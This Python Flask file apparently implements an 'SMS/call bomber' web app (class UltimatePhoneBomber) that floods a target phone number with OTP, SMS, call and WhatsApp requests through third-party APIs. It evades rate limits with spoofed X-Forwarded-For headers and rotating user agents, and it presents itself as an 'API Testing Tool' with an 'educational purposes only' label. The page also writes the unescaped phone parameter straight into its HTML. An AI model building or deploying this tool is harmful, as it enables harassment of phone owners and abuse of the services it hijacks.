# app.py - Vercel compatible version
from flask import Flask, render_template, request, jsonify, Response
import asyncio
import aiohttp
import time
import random
import json
import hashlib
import threading
from concurrent.futures import ThreadPoolExecutor

app = Flask(__name__)

# Import APIs from separate file
try:
    from apis import ULTIMATE_APIS
except ImportError:
    # Fallback if apis.py doesn't exist
    ULTIMATE_APIS = [
        {
            "name": "Demo API",
            "url": "https://httpbin.org/post",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}","demo":true}}',
            "category": "demo",
            "enabled": True
        }
    ]

class SessionRotator:
    """Fast session rotation system"""
    
    def __init__(self):
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        ]
        self.session_cache = {}
        
    def get_rotated_session(self, session_id):
        """Get or create rotated session"""
        if session_id not in self.session_cache:
            connector = aiohttp.TCPConnector(
                limit=0,
                limit_per_host=0,
                ssl=False
            )
            
            session = aiohttp.ClientSession(
                connector=connector,
                timeout=aiohttp.ClientTimeout(total=2),
                headers={'User-Agent': random.choice(self.user_agents)}
            )
            
            self.session_cache[session_id] = session
            
        return self.session_cache[session_id]

class UltimatePhoneBomber:
    def __init__(self):
        self.active_operations = {}
        self.session_rotator = SessionRotator()
        
    def generate_request_id(self, phone):
        """Generate unique request ID"""
        timestamp = int(time.time())
        random_id = random.randint(1000, 9999)
        return f"{phone}_{timestamp}_{random_id}"
    
    async def execute_api_request(self, api, phone, request_id, api_index):
        """Execute single API request"""
        try:
            session_id = f"{request_id}_{api_index}"
            session = self.session_rotator.get_rotated_session(session_id)
            
            name = api["name"]
            url = api["url"](phone) if callable(api["url"]) else api["url"]
            
            headers = api["headers"].copy()
            headers.update({
                "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                "User-Agent": random.choice(self.session_rotator.user_agents)
            })
            
            start_time = time.time()
            
            if api["method"] == "POST":
                data = api["data"](phone) if api["data"] else None
                async with session.post(url, headers=headers, data=data, timeout=2, ssl=False) as response:
                    response_time = time.time() - start_time
                    return {
                        "name": name,
                        "status": response.status,
                        "success": response.status in [200, 201, 202],
                        "time": response_time,
                        "category": api.get("category", "sms")
                    }
            else:
                async with session.get(url, headers=headers, timeout=2, ssl=False) as response:
                    response_time = time.time() - start_time
                    return {
                        "name": name,
                        "status": response.status,
                        "success": response.status in [200, 201, 202],
                        "time": response_time,
                        "category": api.get("category", "sms")
                    }
                    
        except Exception as e:
            return {
                "name": api["name"] if api else "Unknown",
                "status": 0,
                "success": False,
                "error": str(e),
                "time": 0,
                "category": api.get("category", "sms") if api else "unknown"
            }
    
    async def start_bombing(self, phone, request_id):
        """Start bombing with all APIs"""
        operation = {
            "request_id": request_id,
            "phone": phone,
            "start_time": time.time(),
            "total_apis": len(ULTIMATE_APIS),
            "completed": 0,
            "successful": 0,
            "failed": 0,
            "calls": 0,
            "whatsapp": 0,
            "sms": 0,
            "results": [],
            "status": "running"
        }
        
        self.active_operations[request_id] = operation
        
        try:
            # Create tasks for all APIs
            tasks = []
            for i, api in enumerate(ULTIMATE_APIS[:10]):  # Limit to 10 APIs for Vercel
                if api.get("enabled", True):
                    task = self.execute_api_request(api, phone, request_id, i)
                    tasks.append(task)
            
            # Execute requests concurrently
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            # Process results
            for result in results:
                if isinstance(result, dict):
                    operation["results"].append(result)
                    operation["completed"] += 1
                    
                    if result["success"]:
                        operation["successful"] += 1
                        category = result.get("category", "sms")
                        if category == "call":
                            operation["calls"] += 1
                        elif category == "whatsapp":
                            operation["whatsapp"] += 1
                        else:
                            operation["sms"] += 1
                    else:
                        operation["failed"] += 1
            
            operation["end_time"] = time.time()
            operation["duration"] = operation["end_time"] - operation["start_time"]
            operation["status"] = "completed"
            
        except Exception as e:
            operation["error"] = str(e)
            operation["status"] = "failed"
        
        return operation
    
    def get_operation_status(self, request_id):
        """Get operation status"""
        return self.active_operations.get(request_id)

bomber = UltimatePhoneBomber()

@app.route('/')
def home():
    """Home page"""
    phone = request.args.get('number', '')
    
    html = '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>API Testing Tool</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body { font-family: Arial, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; padding: 20px; }
            .container { max-width: 600px; margin: 0 auto; background: white; padding: 30px; border-radius: 15px; box-shadow: 0 20px 60px rgba(0,0,0,0.3); }
            h1 { color: #333; text-align: center; margin-bottom: 10px; }
            .subtitle { text-align: center; color: #666; margin-bottom: 30px; }
            .form-group { margin-bottom: 20px; }
            label { display: block; margin-bottom: 8px; color: #555; font-weight: bold; }
            input { width: 100%; padding: 12px; border: 2px solid #ddd; border-radius: 8px; font-size: 16px; }
            input:focus { outline: none; border-color: #667eea; }
            button { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border: none; padding: 15px; width: 100%; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; transition: transform 0.2s; }
            button:hover { transform: translateY(-2px); }
            .stats { display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; margin: 25px 0; }
            .stat-box { background: #f8f9fa; padding: 15px; border-radius: 8px; text-align: center; }
            .stat-number { font-size: 24px; font-weight: bold; color: #667eea; }
            .warning { background: #fff3cd; border: 1px solid #ffeaa7; color: #856404; padding: 15px; border-radius: 8px; margin: 20px 0; font-size: 14px; }
            .quick-link { text-align: center; margin-top: 20px; }
            .quick-link a { color: #667eea; text-decoration: none; font-weight: bold; }
            .footer { text-align: center; margin-top: 30px; color: #666; font-size: 14px; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🔧 API Testing Tool</h1>
            <p class="subtitle">Test API endpoints with session rotation</p>
            
            <div class="stats">
                <div class="stat-box">
                    <div class="stat-number">''' + str(len(ULTIMATE_APIS)) + '''</div>
                    <div>Total APIs</div>
                </div>
                <div class="stat-box">
                    <div class="stat-number">''' + str(len([api for api in ULTIMATE_APIS if api.get("category") == "call"])) + '''</div>
                    <div>Call APIs</div>
                </div>
                <div class="stat-box">
                    <div class="stat-number">''' + str(len([api for api in ULTIMATE_APIS if api.get("category") == "sms"])) + '''</div>
                    <div>SMS APIs</div>
                </div>
            </div>
            
            <div class="warning">
                ⚠️ For educational purposes only. Use responsibly.
            </div>
            
            <form id="testForm">
                <div class="form-group">
                    <label for="phone">Test Number (10 digits):</label>
                    <input type="text" id="phone" name="phone" placeholder="Enter 10-digit number" maxlength="10" value="''' + phone + '''" required>
                </div>
                
                <button type="button" onclick="startTest()">Start API Testing</button>
            </form>
            
            <div class="quick-link">
                <p>Quick test: <a href="/?number=9876543210">Use demo number</a></p>
            </div>
            
            <div class="footer">
                <p>Hosted on Vercel | Session Rotation Enabled</p>
            </div>
        </div>
        
        <script>
            function startTest() {
                const phone = document.getElementById('phone').value;
                if (phone.length === 10 && /^\\d+$/.test(phone)) {
                    const requestId = Date.now() + '_' + Math.random().toString(36).substr(2, 9);
                    window.location.href = '/status/' + requestId + '?phone=' + phone;
                } else {
                    alert('Please enter a valid 10-digit number');
                }
            }
            
            // Auto-start if phone is provided in URL
            const urlParams = new URLSearchParams(window.location.search);
            const phoneParam = urlParams.get('number');
            if (phoneParam && phoneParam.length === 10 && /^\\d+$/.test(phoneParam)) {
                setTimeout(() => {
                    document.getElementById('phone').value = phoneParam;
                    startTest();
                }, 1000);
            }
        </script>
    </body>
    </html>
    '''
    return html

@app.route('/status/<request_id>')
def status_page(request_id):
    """Status page"""
    phone = request.args.get('phone', '')
    
    if phone and request_id not in bomber.active_operations:
        # Start operation
        asyncio.run(bomber.start_bombing(phone, request_id))
    
    operation = bomber.get_operation_status(request_id)
    
    if not operation:
        return '''
        <html>
        <head>
            <title>Operation Not Found</title>
            <style>
                body { font-family: Arial; text-align: center; padding: 50px; }
            </style>
        </head>
        <body>
            <h1>Operation Not Found</h1>
            <a href="/">Return to Home</a>
        </body>
        </html>
        '''
    
    # Auto-refresh if still running
    refresh_tag = ''
    if operation["status"] == "running":
        refresh_tag = '<meta http-equiv="refresh" content="1">'
    
    return f'''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Operation Status</title>
        {refresh_tag}
        <style>
            body {{
                font-family: Arial, sans-serif;
                max-width: 800px;
                margin: 0 auto;
                padding: 20px;
                background: #f5f5f5;
            }}
            .container {{
                background: white;
                padding: 30px;
                border-radius: 10px;
                box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            }}
            .stats-grid {{
                display: grid;
                grid-template-columns: repeat(4, 1fr);
                gap: 15px;
                margin: 20px 0;
            }}
            .stat-card {{
                background: #f8f9fa;
                padding: 20px;
                border-radius: 8px;
                text-align: center;
            }}
            .stat-number {{
                font-size: 28px;
                font-weight: bold;
                margin: 10px 0;
            }}
            .progress-bar {{
                height: 20px;
                background: #e9ecef;
                border-radius: 10px;
                overflow: hidden;
                margin: 20px 0;
            }}
            .progress-fill {{
                height: 100%;
                background: linear-gradient(90deg, #007bff, #0056b3);
                width: {(operation["completed"] / operation["total_apis"] * 100) if operation["total_apis"] > 0 else 0}%;
                transition: width 0.3s;
            }}
        </style>
    </head>
    <body>
        <div class="container">
            <h1>📊 Operation Status</h1>
            <p>ID: {request_id} | Phone: +91{operation.get('phone', 'N/A')}</p>
            
            <div class="stats-grid">
                <div class="stat-card">
                    <div>Completed</div>
                    <div class="stat-number">{operation["completed"]}/{operation["total_apis"]}</div>
                </div>
                <div class="stat-card">
                    <div>Successful</div>
                    <div class="stat-number">{operation["successful"]}</div>
                </div>
                <div class="stat-card">
                    <div>Calls</div>
                    <div class="stat-number">{operation["calls"]}</div>
                </div>
                <div class="stat-card">
                    <div>SMS</div>
                    <div class="stat-number">{operation["sms"]}</div>
                </div>
            </div>
            
            <div class="progress-bar">
                <div class="progress-fill"></div>
            </div>
            
            <p>Status: <strong>{operation["status"].upper()}</strong></p>
            <p>Duration: <strong>{operation.get('duration', time.time() - operation['start_time']):.2f}s</strong></p>
            
            <div style="text-align: center; margin-top: 30px;">
                <a href="/" style="padding: 10px 20px; background: #6c757d; color: white; text-decoration: none; border-radius: 5px;">New Test</a>
            </div>
        </div>
    </body>
    </html>
    '''

@app.route('/api/start', methods=['POST'])
def api_start():
    """API endpoint to start testing"""
    data = request.json or request.form
    phone = data.get('phone', '')
    
    if not phone or len(phone) != 10 or not phone.isdigit():
        return jsonify({"error": "Invalid phone number"}), 400
    
    request_id = bomber.generate_request_id(phone)
    
    # Start in background
    asyncio.run(bomber.start_bombing(phone, request_id))
    
    return jsonify({
        "success": True,
        "request_id": request_id,
        "status_url": f"/status/{request_id}"
    })

@app.route('/api/status/<request_id>')
def api_status(request_id):
    """API endpoint for status"""
    operation = bomber.get_operation_status(request_id)
    
    if not operation:
        return jsonify({"error": "Operation not found"}), 404
    
    return jsonify(operation)

# This is required for Vercel
@app.route('/api/hello')
def hello():
    return jsonify({"message": "API Testing Tool is running"})

# Vercel requires this
if __name__ == '__main__':
    app.run()
else:
    # For Vercel serverless
    application = app
